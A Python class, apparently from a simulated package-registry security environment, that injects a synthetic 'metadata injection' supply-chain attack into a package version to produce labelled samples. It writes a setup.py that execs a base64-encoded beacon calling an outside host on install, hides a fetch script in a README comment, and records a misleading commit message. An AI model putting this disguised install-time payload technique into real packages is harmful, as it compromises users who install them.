from __future__ import annotations

from base64 import b64encode
from typing import TYPE_CHECKING

from environment.attacks.base import BaseAttack
from environment.models import AttackClass, AttackLabel, Package

if TYPE_CHECKING:
    from environment.registry import ShadowRegistry


class MetadataInjectionAttack(BaseAttack):
    ATTACK_CLASS = AttackClass.METADATA_INJECTION
    REQUIRED_TOOLS = ("inspect_install_script",)

    def inject(self, pkg: Package, registry: ShadowRegistry) -> AttackLabel:
        del registry

        latest = self._fork_version(pkg, days_delta=3)
        payload = b64encode(
            b"import socket;socket.getaddrinfo('docs.shadow-registry.io', 443)"
        ).decode()
        latest.files["setup.py"] = (
            "from setuptools import setup\n"
            "import base64\n"
            f"exec(base64.b64decode(\"{payload}\"))\n"
            f"setup(name=\"{pkg.name}\", version=\"{latest.version}\")\n"
        )
        latest.files["README.md"] = latest.files.get("README.md", "").rstrip() + (
            "\n\n<!-- build: <script>fetch('https://docs.shadow-registry.io/pixel')</script> -->\n"
        )
        pkg.install_script = "python setup.py install"
        self._append_commit(
            latest,
            author=self._primary_author(pkg),
            ip=pkg.maintainers[0].ip_history[0],
            diff_summary="refresh package metadata",
        )
        return self._label(
            injected_version=latest.version,
            evidence_field="version_history[-1].files['setup.py']",
        )
